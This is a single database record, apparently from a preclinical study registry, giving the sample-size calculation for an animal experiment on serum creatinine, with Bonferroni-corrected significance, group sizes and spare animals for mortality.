	(5466,118,'sample_size_calculation_details','\"We aim to detect a minimum difference in serum creatinine of 150umol\\/l, and we expect an SD of 80umol\\/l. We have 6 relevant comparisons between our experimental groups, which we want to test two-sided. We therefore use Bonferonni correction to adjust our desired significance level of p&lt;0.05 to p&lt;0.0083. This means that we need at least 9 animals per group at a powerconstant of 0.8. Because pilot data show that the SD is much lower in the sham operated group, we will limit this group to 6 animals. Because of possible mortality, we will have an additional 5 animals available. \"','2022-03-31 13:23:42','2022-03-31 13:23:42'),
